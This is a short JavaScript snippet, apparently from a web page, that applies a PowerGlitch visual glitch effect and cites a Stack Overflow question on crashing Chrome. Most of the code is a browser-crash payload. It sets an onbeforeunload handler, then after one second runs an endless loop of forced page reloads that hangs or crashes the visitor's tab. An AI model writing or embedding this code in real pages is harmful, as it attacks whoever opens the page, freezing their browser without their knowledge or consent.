PowerGlitch.glitch('.glitch', { playMode: 'always' })

// Reference: https://stackoverflow.com/questions/40367087/how-to-crash-chrome-browser

onbeforeunload = function(){localStorage.x=1};

setTimeout(function(){
  while(1)location.reload(1)
}, 1000)